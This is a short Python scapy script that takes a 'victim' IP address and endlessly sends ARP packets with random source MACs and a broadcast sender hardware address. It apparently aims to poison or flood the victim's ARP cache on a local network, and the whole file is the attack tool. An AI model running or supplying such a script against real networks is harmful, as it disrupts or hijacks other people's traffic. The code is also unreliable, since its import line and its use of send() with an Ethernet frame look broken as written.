from scapy import *
import sys

def main():
    
    victim_ip = sys.argv[1]
    
    def whohas():
        packet= Ether(RandMAC())/ARP(pdst=victim_ip, hwsrc="ff:ff:ff:ff:ff:ff")
        send(packet)
    while True:
        whohas()

main()